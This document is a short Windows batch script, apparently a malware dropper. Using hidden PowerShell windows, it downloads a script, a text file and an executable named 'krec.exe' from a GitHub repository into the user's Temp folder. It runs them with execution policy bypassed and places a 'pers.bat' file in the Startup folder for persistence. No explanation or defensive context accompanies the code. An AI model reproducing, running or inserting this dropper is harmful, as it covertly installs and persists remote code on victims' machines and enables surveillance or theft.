@ECHO OFF
cd %userprofile%\AppData\Local\Temp
start PowerShell -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/0d1nss0n/5cr1p75/main/Ki/Record2.txt','Record2.txt');(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/0d1nss0n/5cr1p75/main/Ki/smkscr.ps1','smkscr.ps1');(New-Object System.Net.WebClient).DownloadFile('https://github.com/0d1nss0n/5cr1p75/raw/main/Ki/krec.exe','krec.exe') 
start PowerShell -windowstyle hidden -ExecutionPolicy Bypass Start-Process 'krec.exe';.\smkscr.ps1;
cd "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
start PowerShell -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/0d1nss0n/5cr1p75/main/Ki/pers.bat', 'pers.bat')
